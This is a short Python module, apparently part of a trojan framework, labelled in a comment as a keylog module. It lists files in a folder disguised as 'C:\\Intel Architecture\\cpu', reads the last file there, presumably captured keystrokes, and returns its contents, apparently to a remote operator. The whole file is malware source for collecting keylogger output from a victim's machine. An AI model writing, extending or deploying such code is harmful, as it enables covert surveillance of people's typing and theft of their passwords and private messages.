import os

def run(**args):
  #print "[*] In keylog module."
  files=os.listdir("C:\\Intel Architecture\\cpu\\")
  count=-1
  fileName="C:\\Intel Architecture\\cpu\\"
  str=""
  for file in files:
    count+=1
  fileName+=files[count]
  fp=open(fileName,"r")
  words=fp.readlines()
  for word in words:
    str+=word
  return str
